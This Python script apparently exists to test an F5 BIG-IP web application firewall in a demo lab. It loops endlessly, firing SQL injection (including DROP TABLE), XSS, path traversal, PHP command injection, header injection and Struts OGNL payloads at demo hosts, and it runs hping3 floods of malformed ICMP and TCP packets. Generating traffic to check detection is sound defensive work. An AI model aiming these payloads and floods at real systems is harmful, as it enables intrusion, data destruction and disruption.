#!/usr/bin/env python3
import requests
import urllib3
import time
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========= CONFIGURE THESE =========
TARGET_BASE_URLS = [
    "https://sslo.demo.f5",
    "https://ast.demo.f5",
    "https://ast80.demo.f5",
    "https://ast55.demo.f5",
    "https://ast42.demo.f5:7443",
    "https://ast42.demo.f5",
]  # all behind BIG-IP ASM

VERIFY_TLS = False          # set True if using valid certs
MAX_WORKERS = 10
TOTAL_REQUESTS = 200
LOG_EVERY = 10

# hping targets
ICMP_TARGETS = ["10.1.10.50", "10.1.10.181"]
BAD_ICMP_TARGETS = ["10.1.10.50", "10.1.10.181"]
BAD_TCP_TARGETS = ["10.1.10.50", "10.1.10.181"]
# ===================================

session = requests.Session()

SQLI_PAYLOADS = [
    "admin' OR 1=1--",
    "' OR '1'='1' --",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "\\\"><script>confirm(1)</script>",
    "<img src=x onerror=alert(1)>",
]

GENERIC_ATTACK_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2fetc/passwd",
    "../../../../windows/win.ini",
    "<?php system('id'); ?>",
]

HEADERS_ATTACKS = [
    {"User-Agent": "<script>alert('ua')</script>"},
    {"X-Forwarded-For": "1.2.3.4' OR '1'='1"},
]

# Apache Struts / OGNL-style payload in Content-Type
STRUTS_CONTENT_TYPE = (
    '${(#_="multipart/form-data").'
    '(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"]'
    '.addHeader("X-Struts-POC","1"))}'
)


def pick_target(i: int) -> str:
    # round-robin across configured hosts
    return TARGET_BASE_URLS[i % len(TARGET_BASE_URLS)]


def attack_sql_in_param(i):
    base = pick_target(i)
    payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
    params = {"search": payload}
    r = session.get(f"{base}/search", params=params, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} SQLi param -> {r.status_code} {r.url}")


def attack_sql_in_body(i):
    base = pick_target(i)
    payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
    data = {"username": "test", "password": payload}
    r = session.post(f"{base}/login", data=data, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} SQLi body -> {r.status_code} {r.url}")


def attack_xss_in_param(i):
    base = pick_target(i)
    payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
    params = {"q": payload}
    r = session.get(f"{base}/search", params=params, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} XSS param -> {r.status_code} {r.url}")


def attack_xss_in_body(i):
    base = pick_target(i)
    payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
    data = {"comment": payload}
    r = session.post(f"{base}/comment", data=data, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} XSS body -> {r.status_code} {r.url}")


def attack_traversal_in_param(i):
    base = pick_target(i)
    payload = GENERIC_ATTACK_PAYLOADS[i % len(GENERIC_ATTACK_PAYLOADS)]
    params = {"file": payload}
    r = session.get(f"{base}/download", params=params, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} Traversal param -> {r.status_code} {r.url}")


def attack_headers(i):
    base = pick_target(i)
    hdr = HEADERS_ATTACKS[i % len(HEADERS_ATTACKS)]
    r = session.get(f"{base}/", headers=hdr, verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} Header attack -> {r.status_code} {r.url}")


def attack_struts_ognl_in_content_type(i):
    """
    Apache Struts / OGNL-style attack in Content-Type header.

    This should trigger Struts/Java code injection / RCE signatures
    if they are enabled on the ASM/AWAF policy for /upload.action.
    """
    base = pick_target(i)
    url = f"{base}/upload.action"

    headers = {
        "Content-Type": STRUTS_CONTENT_TYPE
    }

    # small dummy body
    data = b"test"

    r = session.post(url, headers=headers, data=data,
                     verify=VERIFY_TLS, timeout=5)
    if i % LOG_EVERY == 0:
        print(f"[{i}] {base} Struts OGNL -> {r.status_code} {r.url}")


ATTACK_FUNCS = [
    attack_sql_in_param,
    attack_sql_in_body,
    attack_xss_in_param,
    attack_xss_in_body,
    attack_traversal_in_param,
    attack_headers,
    attack_struts_ognl_in_content_type,
]


def send_attack(i):
    func = ATTACK_FUNCS[i % len(ATTACK_FUNCS)]
    try:
        func(i)
    except Exception as e:
        if i % LOG_EVERY == 0:
            print(f"[{i}] Error: {e}")


def run_hping(cmd: str):
    # wrapper to match `>/dev/null` behavior
    subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def run_hping_batch():
    # icmp packet too large
    for t in ICMP_TARGETS:
        run_hping(f"sudo hping3 -c 3 -d 65495 --icmp {t}")

    # bad icmp checksum
    for t in BAD_ICMP_TARGETS:
        run_hping(f"sudo hping3 -c 7 -b {t}")

    # bad tcp checksum
    for t in BAD_TCP_TARGETS:
        run_hping(f"sudo hping3 -S -c 27 -p 80 -b -d 'Meow' {t}")


def main():
    while True:
        # HTTP/WAF attacks
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(send_attack, range(TOTAL_REQUESTS))

        # L3/L4 hping traffic (roughly once per loop)
        run_hping_batch()

        print("Batch complete, sleeping 2s...")
        time.sleep(2)


if __name__ == "__main__":
    main()
